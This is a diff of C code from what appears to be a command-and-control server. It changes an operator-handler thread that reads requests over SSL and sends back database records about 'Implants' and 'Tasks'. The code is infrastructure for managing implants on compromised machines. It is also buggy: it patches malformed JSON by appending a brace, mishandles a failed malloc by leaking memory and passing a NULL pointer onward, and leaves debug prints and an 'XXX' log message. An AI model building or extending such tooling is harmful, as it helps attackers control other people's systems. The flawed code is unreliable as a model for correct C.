@@ -233,19 +233,12 @@ void *operator_handler(void *Args) {
     
     
     // operator requesting infomartion or add new tasks
-    int x = 0;
     START:
     while (1) {
 
         char *buffer = recv_json(ssl);
         if (!buffer) { 
-            if (x >= 0) { // This condition is always true but helps the compiler
-                x++;
-                continue;
-            } else if (x == 5) {
-                log_message(LOG_ERROR, "Operator console no active anymore");
-                return NULL;
-            }
+            return NULL;
          }
 
         //buffer[bytes_received] = '\0'; 
@@ -264,21 +257,41 @@ void *operator_handler(void *Args) {
             return NULL;
         }
 
-        if (strncmp(about->valuestring, "Implants", 8) == 0){ // all info about implants
+        if (strncmp(about->valuestring, "Implants", 8) == 0) { // all info about implants
             char *implants = GetData(con, "Implants");
-            //send(sock, agents, strlen(agents), 0);
-            if (implants == NULL) {
-                // handle this
+            printf("Caller \n%s\n---\n", implants);
+
+            if (!implants) {
+                log_message(LOG_ERROR, "Failed to get Implant data from database");
                 continue;
+            } 
+        
+            size_t len = strlen(implants);
+            if (len > 0 && implants[len-1] != '}') {
+                char *fixed_json = malloc(len + 2);
+                if (fixed_json) {
+                    strcpy(fixed_json, implants);
+                    fixed_json[len] = '}';
+                    fixed_json[len + 1] = '\0';
+                    free(implants); 
                 }
-            // make sure that json is fine
-            cJSON *re = cJSON_Parse(implants);
-            if (!re) {
-                log_message(LOG_ERROR, "Invalid JSON FROM Implants database");
+                printf("Fixed \n%s\n--", fixed_json);
+                cJSON *re = cJSON_Parse(fixed_json);
+                if (!re) {
+                    log_message(LOG_ERROR, "Invalid JSON FROM Implants database");
+                    free(fixed_json);
+                    continue;;
+                }
+                cJSON_Delete(re);
+                send_json(ssl, fixed_json);
+                free(fixed_json);
+            } else {
+                log_message(LOG_ERROR, "XXX");
+                send_json(ssl, implants);
+                free(implants);
             }
-            //SSL_write(ssl, implants, strlen(implants));
-            send_json(ssl, implants);
-            free(implants);
+        
+            
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
             char *tasks = GetData(con, "Tasks");
             if (tasks == NULL) {
